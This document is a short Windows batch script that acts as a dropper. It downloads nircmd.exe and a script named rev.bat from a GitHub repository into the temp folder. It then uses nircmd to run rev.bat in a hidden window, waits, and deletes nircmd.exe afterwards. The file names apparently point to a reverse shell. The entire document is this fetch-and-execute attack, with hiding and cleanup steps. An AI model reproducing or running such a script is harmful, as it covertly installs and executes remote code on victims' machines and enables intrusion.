@echo off
set "temp_dir=%temp%"
if not exist "%temp_dir%\nircmd.exe" (
    curl https://raw.githubusercontent.com/0x2034/shell/main/nircmd.exe -o "%temp_dir%\nircmd.exe"
)
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp_dir%\rev.bat"
start /min cmd /c "%temp_dir%\nircmd.exe" exec hide cmd /c "%temp_dir%\rev.bat"
ping 127.0.0.1 -n 5 > nul
del "%temp_dir%\nircmd.exe"
